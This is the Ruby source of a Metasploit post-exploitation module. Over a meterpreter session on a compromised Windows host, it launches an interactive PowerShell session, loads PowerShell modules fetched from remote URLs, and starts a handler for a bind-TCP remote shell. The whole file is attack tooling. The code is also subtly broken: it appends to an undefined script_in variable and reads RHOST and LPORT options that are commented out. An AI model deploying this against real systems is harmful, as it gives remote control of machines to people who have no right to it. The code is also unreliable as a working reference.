##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'zlib'

class Metasploit3 < Msf::Exploit::Local

  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Local Interactive Powershell Session",
      'Description'          => %q{
        This module will start a new Interactive PowerShell session over a meterpreter session.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DisclosureDate'=> "Apr 15 2015",
      'Author'               => [
        'Ben Turner', # changed module to load interactive powershell via bind tcp
        'Dave Hardy', # changed module to load interactive powershell via bind tcp and load other powershell modules
        'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
        'RageLtMan' # post module
        ],
      'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
      'Targets'       =>
        [
          [ 'Windows', { } ],
        ],
    ))

    register_options(
      [
        OptString.new( 'LOAD_MODULES',  [false, 'A list of powershell modules seperated by a comma, for example set LOAD_MODULES http://www.powershell.com/power1.ps1,http://www.powershell.com/power2.ps1,', ""]),
#        OptString.new( 'RHOST',  [false, 'The IP of the system being exploited = rhost', ""]),
#        OptString.new( 'LPORT',  [false, 'The PORT of the PowerShell listener = lpost', "55555"])
      ], self.class)

    register_advanced_options(
      [      ], self.class)

  end

  # Function for setting multi handler for autocon
  #-------------------------------------------------------------------------------
  def set_handler(rhost,rport)
    mul = session.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = @client.workspace
    mul.datastore['PAYLOAD']   = "windows/shell_bind_tcp"
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = rport

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_status("Multi/handler started: payload=windows/shell_bind_tcp rhost=" + rhost + " lport=" + rport)
  end

  def exploit
    @client = client
    if (datastore['LOAD_MODULES'].empty?)
      modsall = ''
    else
      print_status("Loading the following modules into the interactive PowerShell session:")
      modsall = ''
      modstemp = datastore['LOAD_MODULES'].to_s
      modsarray = modstemp.split(',')
      modsarray.each do |mod|
      print_good(mod.to_s)
      if mod == modsarray.last
         modsall = modsall + "\"" + mod.to_s + "\""
      else
         modsall = modsall + "\"" + mod.to_s + "\",\n"
      end
      end
      print("\n")
    end


    if (datastore['LOAD_MODULES'].empty?)
    script_in = script_in + "powerfun \n"
    else
    script_in = script_in + "powerfun 1\n"
    end

    # End of file marker
    eof = Rex::Text.rand_text_alpha(8)
    env_suffix = Rex::Text.rand_text_alpha(8)

    # Get target's computer name
    computer_name = session.sys.config.sysinfo['Computer']

    # Compress the script
    compressed_script = compress_script(script_in, eof)
    script = compressed_script
    cmd_out, running_pids, open_channels = execute_script(script, 15)
    print_status("Started PowerShell on " + computer_name + ". The PID to kill once you have finished: " + running_pids[0].to_s)

    # Default parameters for payload
    if (datastore['RHOST'].empty?)
      rhost = @client.session_host
    else
      rhost = datastore['RHOST']
    end

    if (datastore['LPORT'].empty?)
      rport = 55555
    else
      rport = datastore['LPORT']
    end
    set_handler(rhost,rport)
    print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
    print("\n")
  end
end
